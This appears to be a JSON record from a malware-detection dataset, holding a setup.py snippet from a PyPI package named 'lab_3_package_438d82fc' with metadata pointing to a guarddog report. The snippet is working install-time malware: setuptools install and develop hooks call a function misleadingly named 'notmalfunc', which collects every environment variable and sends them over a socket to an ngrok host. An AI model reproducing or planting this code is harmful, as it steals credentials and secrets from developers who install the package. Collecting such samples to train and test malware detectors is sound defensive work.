[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import os\nimport socket\n\ndef notmalfunc():\n    # Extract environment variables\n    data = dict(os.environ)\n    data_str = \"\\n\".join([f\"{k}: {v}\" for k, v in data.items()])\n    \n    # Connect to ngrok-exposed Netcat listener\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect(('2.tcp.eu.ngrok.io', 19382))  # Replace with the correct ngrok address and port\n        sock.sendall(data_str.encode())\n        sock.close()\n    except Exception as e:\n        print(f\"Error connecting to the server: {e}\")\n\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()"
  },
  {
    "metadata": {
      "package_name": "lab_3_package_438d82fc-0.1.1",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/lab_3_package_438d82fc-0.1.1.txt"
    }
  }
]